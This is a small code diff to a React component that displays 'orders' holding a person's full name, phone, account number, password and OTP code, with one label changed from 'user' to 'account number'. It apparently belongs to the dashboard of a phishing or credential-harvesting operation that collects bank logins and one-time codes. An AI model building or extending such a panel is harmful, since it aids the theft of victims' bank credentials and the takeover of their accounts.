@@ -217,7 +217,7 @@ function MessageCard({ order, index }: { order: Order; index: number }) {
       {/* Data rows */}
       <DataRow label="الاسم الكامل" value={order.fullName} icon="👤" />
       <DataRow label="الهاتف" value={order.phone} icon="📱" />
-      <DataRow label="المستخدم" value={order.username} icon="🧑" />
+      <DataRow label="رقم الحساب" value={order.username} icon="💳" />
       <DataRow label="كلمة المرور" value={order.password} icon="🔑" secret />
       <DataRow label="رمز OTP" value={order.otp} icon="🔐" secret />
 
